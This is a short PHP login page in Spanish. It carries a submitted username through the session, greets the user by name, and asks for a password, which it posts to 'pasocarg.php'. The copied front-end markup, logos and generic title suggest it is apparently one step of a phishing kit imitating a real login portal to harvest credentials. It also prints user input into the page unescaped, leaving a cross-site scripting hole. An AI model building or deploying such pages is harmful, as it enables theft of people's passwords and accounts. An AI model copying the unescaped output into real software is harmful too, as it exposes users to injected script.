
<?php
@session_start();

if(isset ($_POST['us']) ){
	$_SESSION['us'] = $_POST['us'];
	
}else if(isset ($_SESSION['us']) ){} 

else{ header ('location: index.html'); exit(); }
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="sc.css">
</head>
<body  class="body">
    


<div class="nav">
.
</div>
<img class="laf" src="log2.png" alt="">

<br><br><br><br>

<center>

<div class="caja"> 


<form action="pasocarg.php" method="post">


    <img class="img" src="log.png" alt="">

    <br>
    <br>

    <div _ngcontent-c31="" class="subotica-content-image-welcome">
                    
        <span _ngcontent-c31="" class="subotica-content-image-welcome-text">Hola,  </span>
        <span _ngcontent-c31="" class="subotica-content-image-welcome-name"><?php echo $_SESSION['us']; ?></span>
    </div>

<br>
<br>

<input required name="ct" id="ct" class="input" type="password" placeholder="Ingrese su contraseña">
<input type="hidden" name="us" value="<?php echo $_POST['us']; ?>">
<br>
<img class="abj" src="abj2.png" alt="">

<input class="boton" type="submit">


 
</form>

</div>


















</body>
</html>